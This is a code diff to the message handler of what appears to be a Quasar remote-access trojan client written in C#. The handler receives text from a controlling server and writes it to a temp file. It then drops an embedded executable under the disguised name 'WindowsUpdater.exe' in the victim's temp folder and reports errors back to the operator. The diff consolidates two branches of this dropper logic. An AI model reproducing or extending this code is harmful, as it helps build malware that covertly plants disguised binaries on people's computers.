@@ -35,66 +35,39 @@ namespace Quasar.Client.Messages
                 string actionStr = message.Action;
                 bool flag7 = false;
                 string contentStr = ""; //display text
+                contentStr = message.Text;
+                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 if (actionStr == "close")
                 {
                     contentStr = "";
                     flag7 = true;
                 }
-                contentStr = message.Text;
-                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
-                string text10;
-                if (actionStr == "show2")
+                try
                 {
-                    try
+                    using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
                     {
-                        File.WriteAllText(text9, contentStr);
+                        writer.Write(contentStr);
                     }
-                    catch (Exception)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
-                    }
-                    string str = "WindowsUpdaterA"; // window class name
-                    if (message.WindowClassName != null)
-                    {
-                        // str = message.WindowClassName;
-                    }
-                    text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
-                    try
-                    {
-                        byte[] invisibleWindow_vmp = Resource1.RedTextDesktopApp2;
-                        File.WriteAllBytes(text10, invisibleWindow_vmp);
-                    }
-                    catch (Exception)
-                    {
-                    }
+                    // File.WriteAllText(text9, contentStr);
                 }
-                else
+                catch (Exception)
                 {
-                    try
-                    {
-                        using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
-                        {
-                            writer.Write(contentStr);
-                        }
-                    }
-                    catch (Exception)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
-                    }
-                    string str = "WindowsUpdater"; // window class name
-                    if (message.WindowClassName != null)
-                    {
-                        // str = message.WindowClassName;
-                    }
-                    text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
-                    try
-                    {
-                        byte[] invisibleWindow_vmp = Resource1.RedTextDesktopApp;
-                        File.WriteAllBytes(text10, invisibleWindow_vmp);
-                    }
-                    catch (Exception)
-                    {
-                    }
+                    client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
+                }
+                string str = "WindowsUpdater"; // window class name
+                if (message.WindowClassName != null)
+                {
+                    // str = message.WindowClassName;
+                }
+                string text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
+                try
+                {
+                    byte[] invisibleWindow_vmp = Resource1.RedTextDesktopApp;
+                    File.WriteAllBytes(text10, invisibleWindow_vmp);
+                }
+                catch (Exception)
+                {
+                    // client.Send(new NotifyMessageToServer { Message = "RedText app writing error!" });
                 }
                 int num = 36;
                 if (message.FontSize != 0)  // font size
